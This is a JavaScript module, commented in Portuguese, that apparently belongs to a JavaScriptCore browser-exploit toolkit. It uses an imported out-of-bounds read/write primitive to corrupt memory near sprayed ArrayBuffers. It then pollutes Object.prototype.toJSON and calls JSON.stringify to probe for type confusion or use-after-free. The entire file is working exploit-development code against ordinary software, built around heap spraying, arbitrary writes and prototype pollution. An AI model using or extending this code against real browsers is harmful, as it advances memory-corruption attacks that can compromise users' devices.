// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64,
    corruption_target_offsets_in_oob_real: [
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 32,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128),
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + 8,
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + 16,
    ],
    values_to_write_for_corruption: [
        0xFFFFFFFF,
        0x0,
        0x1,
        parseInt(KNOWN_STRUCTURE_IDS.TYPE_JS_FUNCTION, 16) || 0x41414141,
        parseInt(KNOWN_STRUCTURE_IDS.TYPE_JS_STRING, 16) || 0x42424242,
        parseInt(KNOWN_STRUCTURE_IDS.TYPE_JS_OBJECT_GENERIC, 16) || 0x43434343,
    ],
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    stop_on_first_success: true,
    spray_count_victim_ab: 100,
};
// --- Fim dos Parâmetros ---

export async function testJsonTypeConfusionUAFSpeculative() {
    const FNAME = "testJsonTypeConfusionUAFSpeculative";
    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (S3) (v2.5) ---`, "test", FNAME);
    logS3(`   Configurações do Teste: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}, spray_victim_ab=${SPECULATIVE_TEST_CONFIG.spray_count_victim_ab}`, "info", FNAME);
    logS3(`   Offsets de corrupção (abs em oob_real): ${SPECULATIVE_TEST_CONFIG.corruption_target_offsets_in_oob_real.map(o => toHex(o)).join(', ')}`, "info", FNAME);
    logS3(`   Valores para corrupção: ${SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption.map(v => toHex(v)).join(', ')}`, "info", FNAME);

    let overallTestSuccess = false;
    let victimAbs_spray = [];

    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey];

    for (const corruption_offset_abs of SPECULATIVE_TEST_CONFIG.corruption_target_offsets_in_oob_real) {
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption) {
            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

            await triggerOOB_primitive(logS3);
            if (!oob_array_buffer_real) {
                logS3("Falha ao configurar ambiente OOB. Abortando esta iteração.", "error", FNAME);
                continue;
            }

            victimAbs_spray = [];
            for(let i=0; i < SPECULATIVE_TEST_CONFIG.spray_count_victim_ab; i++){
                victimAbs_spray.push(new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size));
            }
            let target_victim_ab = victimAbs_spray[victimAbs_spray.length - 1];
            logS3(`ArrayBuffer vítima (${SPECULATIVE_TEST_CONFIG.victim_ab_size} bytes) recriado. Alvo: victimAbs_spray[${victimAbs_spray.length - 1}]`, "info", FNAME);

            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;
            let currentIterationSuccess = false;
            let originalValueAtCorruptionOffset = null;

            try {
                logS3(`Iteração: Corrompendo offset abs ${toHex(corruption_offset_abs)} com valor ${toHex(value_to_write)}`, "info", FNAME);

                if (corruption_offset_abs >= 0 && corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                    try {
                        originalValueAtCorruptionOffset = oob_read_absolute(corruption_offset_abs, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption, logS3);
                        logS3(`  Valor original em ${toHex(corruption_offset_abs)}: ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}`, "info", FNAME);
                    } catch (e) {
                        originalValueAtCorruptionOffset = null;
                    }
                } else {
                     logS3(`  AVISO: Offset de corrupção ${toHex(corruption_offset_abs)} está fora dos limites de oob_array_buffer_real. Pulando escrita OOB.`, "warn", FNAME);
                }

                Object.defineProperty(Object.prototype, ppKey, {
                    value: function() {
                        const currentOperationThis = this;
                        logS3(`[${ppKey} Poluído] Chamado! (para offset ${toHex(corruption_offset_abs)}, valor ${toHex(value_to_write)})`, "vuln", FNAME);
                        logS3(`  Contexto: typeof this = ${typeof currentOperationThis}, instanceof ArrayBuffer = ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
                        try {
                            logS3(`  Contexto: this.constructor.name = ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME);
                        } catch (e) { /* ignorar */ }
                        logS3(`  Contexto: Object.prototype.toString.call(this) = ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME);

                        if (currentOperationThis !== target_victim_ab && victimAbs_spray.includes(currentOperationThis)) {
                            logS3(`  INFO: 'this' no toJSON é um dos ABs pulverizados, mas NÃO o target_victim_ab. Index: ${victimAbs_spray.indexOf(currentOperationThis)}`, "info", FNAME);
                        } else if (currentOperationThis !== target_victim_ab) {
                            logS3(`  AVISO: 'this' (${Object.prototype.toString.call(currentOperationThis)}) no toJSON NÃO é o target_victim_ab!`, "warn", FNAME);
                        }


                        try {
                            new DataView(currentOperationThis);
                            logS3(`  [${ppKey} Poluído] DataView(this) criado com SUCESSO. 'this' ainda é um ArrayBuffer válido. byteLength=${currentOperationThis.byteLength}`, "good", FNAME);
                            return { toJSON_executed_ok: true, type: Object.prototype.toString.call(currentOperationThis), byteLength: currentOperationThis.byteLength };
                        } catch (e) {
                            logS3(`  [${ppKey} Poluído] ERRO ao operar sobre 'this': ${e.name} - ${e.message}`, "critical", FNAME);
                            logS3(`  ---> SINAL DE TYPE CONFUSION / UAF <--- (Offset: ${toHex(corruption_offset_abs)}, Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
                            currentIterationSuccess = true;
                            overallTestSuccess = true;
                            return { toJSON_error: true, message: e.message, type_at_error: Object.prototype.toString.call(currentOperationThis) };
                        }
                    },
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;

                if (corruption_offset_abs >= 0 && corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                    logS3(`  CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} em ${toHex(corruption_offset_abs)}`, "warn", FNAME);
                    oob_write_absolute(corruption_offset_abs, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption, logS3);
                }
                await PAUSE_S3(SHORT_PAUSE_S3);

                logS3(`Chamando JSON.stringify(target_victim_ab)...`, "info", FNAME);
                let stringifyResult = null;
                try {
                    stringifyResult = JSON.stringify(target_victim_ab);
                    logS3(`Resultado de JSON.stringify: ${String(stringifyResult).substring(0, 250)}`, "info", FNAME);
                    if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
                        logS3("SUCESSO ESPECULATIVO CONFIRMADO: Erro capturado dentro do toJSON poluído.", "vuln", FNAME);
                    } else if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_executed_ok:true")) {
                        logS3("toJSON poluído executou sem erro interno aparente.", "good", FNAME);
                    }
                } catch (e) {
                    logS3(`ERRO EXTERNO durante JSON.stringify(target_victim_ab): ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
                    console.error(`JSON.stringify UAF/TC Test Error (Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}):`, e);
                    currentIterationSuccess = true;
                    overallTestSuccess = true;
                }

            } catch (mainIterationError) {
                logS3(`Erro na iteração (Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}): ${mainIterationError.message}`, "error", FNAME);
            } finally {
                if (originalValueAtCorruptionOffset !== null && corruption_offset_abs >= 0 && corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength && oob_array_buffer_real) {
                    try {
                        oob_write_absolute(corruption_offset_abs, originalValueAtCorruptionOffset, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption, logS3);
                    } catch (e_restore) { /* ignorar falha na restauração por enquanto */ }
                }
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    } else { delete Object.prototype[ppKey]; }
                }
            }
            logS3(`Iteração Concluída (Offset: ${toHex(corruption_offset_abs)}, Valor: ${toHex(value_to_write)}). Sucesso Especulativo: ${currentIterationSuccess}`, currentIterationSuccess ? "vuln" : "info", FNAME);
            if (currentIterationSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
        clearOOBEnvironment();
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
        await PAUSE_S3(SHORT_PAUSE_S3);
    }
    victimAbs_spray = null;
    logS3(`--- Teste Especulativo UAF/Type Confusion via JSON Concluído (Sucesso Especulativo Geral: ${overallTestSuccess}) ---`, "test", FNAME);
}
